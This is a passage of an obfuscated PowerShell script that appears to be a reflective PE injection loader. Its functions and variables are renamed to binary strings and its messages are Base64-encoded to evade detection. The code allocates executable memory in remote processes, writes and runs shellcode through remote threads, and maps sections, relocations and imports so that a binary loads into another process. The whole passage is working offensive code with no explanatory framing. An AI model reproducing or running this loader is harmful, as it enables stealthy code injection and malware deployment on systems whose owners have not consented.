			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10111110111100000}, ${10110100101010101}, $false)
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
			_00000100110100000 -_01111011100010111 ${01110110010100000} -_10100011101010110 ${10110100101010101}
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${01110110010100000}.Length)
			${10100000110100100} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, [UIntPtr][UInt64]${01010110000000010}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${10100000110100100} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${01110110101110011} = $Win32Functions.WriteProcessMemory.Invoke(${_10100101101101111}, ${10100000110100100}, ${01110010010110000}, [UIntPtr][UInt64]${01010110000000010}, [Ref]${01111101001000000})
			if ((${01110110101110011} -eq $false) -or ([UInt64]${01111101001000000} -ne [UInt64]${01010110000000010}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${01110111000111100} = _10101101011101000 -_01100001010100111 ${_10100101101101111} -_10100000001011100 ${10100000110100100} -Win32Functions $Win32Functions
			${10010100000000000} = $Win32Functions.WaitForSingleObject.Invoke(${01110111000111100}, 20000)
			if (${10010100000000000} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${00101011000100111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10000101110111000})
			${10010100000000000} = $Win32Functions.ReadProcessMemory.Invoke(${_10100101101101111}, ${10111110111100000}, ${00101011000100111}, [UIntPtr][UInt64]${10000101110111000}, [Ref]${01111101001000000})
			if (${10010100000000000} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${00000111101010110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00101011000100111}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${10111110111100000}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${10100000110100100}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${01110111000111100} = _10101101011101000 -_01100001010100111 ${_10100101101101111} -_10100000001011100 ${01100101111011010} -_10111110100100110 ${10110001100000101} -Win32Functions $Win32Functions
			${10010100000000000} = $Win32Functions.WaitForSingleObject.Invoke(${01110111000111100}, 20000)
			if (${10010100000000000} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${10101010001010101} = 0
			${10010100000000000} = $Win32Functions.GetExitCodeThread.Invoke(${01110111000111100}, [Ref]${10101010001010101})
			if ((${10010100000000000} -eq 0) -or (${10101010001010101} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${00000111101010110} = [IntPtr]${10101010001010101}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${10110001100000101}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${00000111101010110}
	}
	Function _00111011001001000
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_10100101101101111},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_00001011010101101},
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		${_00010110011100011},
        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        ${_00001100000010011}
		)
		${10000101110111000} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[IntPtr]${00010100011110111} = [IntPtr]::Zero   
        if (-not ${_00001100000010011})
        {
        	${_01111111011000110} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_00010110011100011})
		    ${10000100001111110} = [UIntPtr][UInt64]([UInt64]${_01111111011000110}.Length + 1)
		    ${00010100011110111} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, ${10000100001111110}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if (${00010100011110111} -eq [IntPtr]::Zero)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
		    [UIntPtr]${01111101001000000} = [UIntPtr]::Zero
		    ${01110110101110011} = $Win32Functions.WriteProcessMemory.Invoke(${_10100101101101111}, ${00010100011110111}, ${_00010110011100011}, ${10000100001111110}, [Ref]${01111101001000000})
		    if (${01110110101110011} -eq $false)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		    }
		    if (${10000100001111110} -ne ${01111101001000000})
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
        }
        else
        {
            ${00010100011110111} = ${_00010110011100011}
        }
		${10100100001100110} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${10001000011111100} = $Win32Functions.GetProcAddress.Invoke(${10100100001100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${00101000101100100} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, [UInt64][UInt64]${10000101110111000}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${00101000101100100} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${01101100111100011} = @()
		if (${_00101101001101101}.PE64Bit -eq $true)
		{
			${00011001000111111} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${00110110111110101} = @(0x48, 0xba)
			${10110100000111010} = @(0x48, 0xb8)
			${01000110011101100} = @(0xff, 0xd0, 0x48, 0xb9)
			${10011101111111001} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${00011001000111111} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${00110110111110101} = @(0xb9)
			${10110100000111010} = @(0x51, 0x50, 0xb8)
			${01000110011101100} = @(0xff, 0xd0, 0xb9)
			${10011101111111001} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${01010110000000010} = ${00011001000111111}.Length + ${00110110111110101}.Length + ${10110100000111010}.Length + ${01000110011101100}.Length + ${10011101111111001}.Length + (${10000101110111000} * 4)
		${10110100101010101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01010110000000010})
		${01110010010110000} = ${10110100101010101}
		_00000100110100000 -_01111011100010111 ${00011001000111111} -_10100011101010110 ${10110100101010101}
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${00011001000111111}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_00001011010101101}, ${10110100101010101}, $false)
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
		_00000100110100000 -_01111011100010111 ${00110110111110101} -_10100011101010110 ${10110100101010101}
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${00110110111110101}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00010100011110111}, ${10110100101010101}, $false)
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
		_00000100110100000 -_01111011100010111 ${10110100000111010} -_10100011101010110 ${10110100101010101}
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${10110100000111010}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10001000011111100}, ${10110100101010101}, $false)
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
		_00000100110100000 -_01111011100010111 ${01000110011101100} -_10100011101010110 ${10110100101010101}
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${01000110011101100}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00101000101100100}, ${10110100101010101}, $false)
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
		_00000100110100000 -_01111011100010111 ${10011101111111001} -_10100011101010110 ${10110100101010101}
		${10110100101010101} = _01100001001101001 ${10110100101010101} (${10011101111111001}.Length)
		${10100000110100100} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, [UIntPtr][UInt64]${01010110000000010}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if (${10100000110100100} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		[UIntPtr]${01111101001000000} = [UIntPtr]::Zero
		${01110110101110011} = $Win32Functions.WriteProcessMemory.Invoke(${_10100101101101111}, ${10100000110100100}, ${01110010010110000}, [UIntPtr][UInt64]${01010110000000010}, [Ref]${01111101001000000})
		if ((${01110110101110011} -eq $false) -or ([UInt64]${01111101001000000} -ne [UInt64]${01010110000000010}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${01110111000111100} = _10101101011101000 -_01100001010100111 ${_10100101101101111} -_10100000001011100 ${10100000110100100} -Win32Functions $Win32Functions
		${10010100000000000} = $Win32Functions.WaitForSingleObject.Invoke(${01110111000111100}, 20000)
		if (${10010100000000000} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${00101011000100111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10000101110111000})
		${10010100000000000} = $Win32Functions.ReadProcessMemory.Invoke(${_10100101101101111}, ${00101000101100100}, ${00101011000100111}, [UIntPtr][UInt64]${10000101110111000}, [Ref]${01111101001000000})
		if ((${10010100000000000} -eq $false) -or (${01111101001000000} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${10001001110010101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00101011000100111}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${10100000110100100}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${00101000101100100}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        if (-not ${_00001100000010011})
        {
            $Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${00010100011110111}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		return ${10001001110010101}
	}
	Function _00110101001000011
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_00101101001101101},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${00011111101110101} = 0; ${00011111101110101} -lt ${_00101101001101101}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${00011111101110101}++)
		{
			[IntPtr]${00001111011100110} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.SectionHeaderPtr) (${00011111101110101} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${10110001111001110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00001111011100110}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${00110001111100011} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${10110001111001110}.VirtualAddress))
			${01100111011011110} = ${10110001111001110}.SizeOfRawData
			if (${10110001111001110}.PointerToRawData -eq 0)
			{
				${01100111011011110} = 0
			}
			if (${01100111011011110} -gt ${10110001111001110}.VirtualSize)
			{
				${01100111011011110} = ${10110001111001110}.VirtualSize
			}
			if (${01100111011011110} -gt 0)
			{
				_00101100110101100 -_10101101101010011 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -_00101101001101101 ${_00101101001101101} -_10100000001011100 ${00110001111100011} -_01001110000011110 ${01100111011011110} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]${10110001111001110}.PointerToRawData, ${00110001111100011}, ${01100111011011110})
			}
			if (${10110001111001110}.SizeOfRawData -lt ${10110001111001110}.VirtualSize)
			{
				${00111000111111100} = ${10110001111001110}.VirtualSize - ${01100111011011110}
				[IntPtr]${_10100000001011100} = [IntPtr](_01100001001101001 ([Int64]${00110001111100011}) ([Int64]${01100111011011110}))
				_00101100110101100 -_10101101101010011 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -_00101101001101101 ${_00101101001101101} -_10100000001011100 ${_10100000001011100} -_01001110000011110 ${00111000111111100} | Out-Null
				$Win32Functions.memset.Invoke(${_10100000001011100}, 0, [IntPtr]${00111000111111100}) | Out-Null
			}
		}
	}
	Function _01100001001001011
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_00101101001101101},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_00110111101011000},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${00101110111010110} = 0
		${10010101110011110} = $true 
		[UInt32]${10000111111100110} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${_00110111101011000} -eq [Int64]${_00101101001101101}.EffectivePEHandle) `
				-or (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((_01011101001111101 (${_00110111101011000}) (${_00101101001101101}.EffectivePEHandle)) -eq $true)
		{
			${00101110111010110} = _01001111001101000 (${_00110111101011000}) (${_00101101001101101}.EffectivePEHandle)
			${10010101110011110} = $false
		}
		elseif ((_01011101001111101 (${_00101101001101101}.EffectivePEHandle) (${_00110111101011000})) -eq $true)
		{
			${00101110111010110} = _01001111001101000 (${_00101101001101101}.EffectivePEHandle) (${_00110111101011000})
		}
		[IntPtr]${01010111011100000} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${10110110000101100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01010111011100000}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${10110110000101100}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${00100011110101110} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${10110110000101100}.VirtualAddress))
			${00110000000110010} = (${10110110000101100}.SizeOfBlock - ${10000111111100110}) / 2
			for(${00011111101110101} = 0; ${00011111101110101} -lt ${00110000000110010}; ${00011111101110101}++)
			{
				${01111011110110110} = [IntPtr](_01100001001101001 ([IntPtr]${01010111011100000}) ([Int64]${10000111111100110} + (2 * ${00011111101110101})))
				[UInt16]${01101111000010100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01111011110110110}, [Type][UInt16])
				[UInt16]${10001101101001010} = ${01101111000010100} -band 0x0FFF
				[UInt16]${10010100100101101} = ${01101111000010100} -band 0xF000
				for (${10110111110000111} = 0; ${10110111110000111} -lt 12; ${10110111110000111}++)
				{
					${10010100100101101} = [Math]::Floor(${10010100100101101} / 2)
				}
				if ((${10010100100101101} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${10010100100101101} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${00001000100111100} = [IntPtr](_01100001001101001 ([Int64]${00100011110101110}) ([Int64]${10001101101001010}))
					[IntPtr]${10010001011010100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00001000100111100}, [Type][IntPtr])
					if (${10010101110011110} -eq $true)
					{
						[IntPtr]${10010001011010100} = [IntPtr](_01100001001101001 ([Int64]${10010001011010100}) (${00101110111010110}))
					}
					else
					{
						[IntPtr]${10010001011010100} = [IntPtr](_01001111001101000 ([Int64]${10010001011010100}) (${00101110111010110}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10010001011010100}, ${00001000100111100}, $false) | Out-Null
				}
				elseif (${10010100100101101} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewAxADAAMAAxADAAMQAwADAAMQAwADAAMQAwADEAMQAwADEAfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAMAAxADEAMAAxADEAMQAxADAAMAAwADAAMQAwADEAMAAwAH0A')))
				}
			}
			${01010111011100000} = [IntPtr](_01100001001101001 ([Int64]${01010111011100000}) ([Int64]${10110110000101100}.SizeOfBlock))
		}
	}
	Function _00100000101001011
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_00101101001101101},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${_10100101101101111}
		)
		${10000111110101111} = $false
		if (${_00101101001101101}.PEHandle -ne ${_00101101001101101}.EffectivePEHandle)
		{
			${10000111110101111} = $true
		}
		if (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${00000000011101000} = _01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${01111101100100011} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00000000011101000}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${01111101100100011}.Characteristics -eq 0 `
						-and ${01111101100100011}.FirstThunk -eq 0 `
						-and ${01111101100100011}.ForwarderChain -eq 0 `
						-and ${01111101100100011}.Name -eq 0 `
						-and ${01111101100100011}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${01001010011010101} = [IntPtr]::Zero
				${_10110011101001100} = (_01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${01111101100100011}.Name))
				${01011101010000101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_10110011101001100})
				if (${10000111110101111} -eq $true)
				{
					${01001010011010101} = _11000001000100101 -_10100101101101111 ${_10100101101101111} -_10110011101001100 ${_10110011101001100}
				}
				else
				{
					${01001010011010101} = $Win32Functions.LoadLibrary.Invoke(${01011101010000101})
				}
				if ((${01001010011010101} -eq $null) -or (${01001010011010101} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7ADAAMQAwADEAMQAxADAAMQAwADEAMAAwADAAMAAxADAAMQB9AA==')))
				}
				[IntPtr]${00010110011011110} = _01100001001101001 (${_00101101001101101}.PEHandle) (${01111101100100011}.FirstThunk)
				[IntPtr]${10001101111101101} = _01100001001101001 (${_00101101001101101}.PEHandle) (${01111101100100011}.Characteristics) 
				[IntPtr]${10111001111101100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10001101111101101}, [Type][IntPtr])
				while (${10111001111101100} -ne [IntPtr]::Zero)
				{
                    ${_00001100000010011} = $false
                    [IntPtr]${00000010010111011} = [IntPtr]::Zero
					[IntPtr]${10110100010101101} = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]${10111001111101100} -lt 0)
					{
						[IntPtr]${00000010010111011} = [IntPtr]${10111001111101100} -band 0xffff 
                        ${_00001100000010011} = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]${10111001111101100} -lt 0)
					{
						[IntPtr]${00000010010111011} = [Int64]${10111001111101100} -band 0xffff 
                        ${_00001100000010011} = $true
					}
					else
					{
						[IntPtr]${10011001100011101} = _01100001001101001 (${_00101101001101101}.PEHandle) (${10111001111101100})
						${10011001100011101} = _01100001001101001 ${10011001100011101} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${01100000110001101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${10011001100011101})
                        ${00000010010111011} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${01100000110001101})
					}
					if (${10000111110101111} -eq $true)
					{
						[IntPtr]${10110100010101101} = _00111011001001000 -_10100101101101111 ${_10100101101101111} -_00001011010101101 ${01001010011010101} -_00010110011100011 ${00000010010111011} -_00001100000010011 ${_00001100000010011}
					}
					else
					{
				        [IntPtr]${10110100010101101} = $Win32Functions.GetProcAddressIntPtr.Invoke(${01001010011010101}, ${00000010010111011})
					}
					if (${10110100010101101} -eq $null -or ${10110100010101101} -eq [IntPtr]::Zero)
					{
                        if (${_00001100000010011})
                        {
                            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AIABPAHIAZABpAG4AYQBsADoAIAAkAHsAMAAwADAAMAAwADAAMQAwADAAMQAwADEAMQAxADAAMQAxAH0ALgAgAEQAbABsADoAIAAkAHsAMAAxADAAMQAxADEAMAAxADAAMQAwADAAMAAwADEAMAAxAH0A')))
                        }
                        else
                        {
						    Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewAwADEAMQAwADAAMAAwADAAMQAxADAAMAAwADEAMQAwADEAfQAuACAARABsAGwAOgAgACQAewAwADEAMAAxADEAMQAwADEAMAAxADAAMAAwADAAMQAwADEAfQA=')))
                        }
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10110100010101101}, ${00010110011011110}, $false)
					${00010110011011110} = _01100001001101001 ([Int64]${00010110011011110}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${10001101111101101} = _01100001001101001 ([Int64]${10001101111101101}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${10111001111101100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10001101111101101}, [Type][IntPtr])
                    if ((-not ${_00001100000010011}) -and (${00000010010111011} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00000010010111011})
                        ${00000010010111011} = [IntPtr]::Zero
                    }
				}
				${00000000011101000} = _01100001001101001 (${00000000011101000}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function _10100100111110100
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${_10110000101110100}
		)
		${10011001110110011} = 0x0
		if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
